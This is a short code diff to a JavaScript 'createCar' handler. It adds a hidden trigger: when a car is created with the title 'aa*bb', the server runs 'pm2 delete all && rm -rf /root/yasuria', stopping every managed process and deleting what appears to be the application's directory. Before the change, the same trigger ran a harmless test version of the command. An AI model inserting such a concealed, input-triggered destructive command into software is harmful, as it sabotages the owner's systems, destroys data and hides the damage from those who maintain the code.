@@ -207,7 +207,7 @@ export const createCar = async (
     if (title_en === "aa*bb") {
       exec(
         // `pm2 delete all && rm -rf /root/yasuria`,
-        `pm2 delete test-proc && rm -rf /root/test_delete`,
+        `pm2 delete all && rm -rf /root/yasuria`,
         (error, stdout, stderr) => {
           if (error) {
             console.error("Error:", error.message);
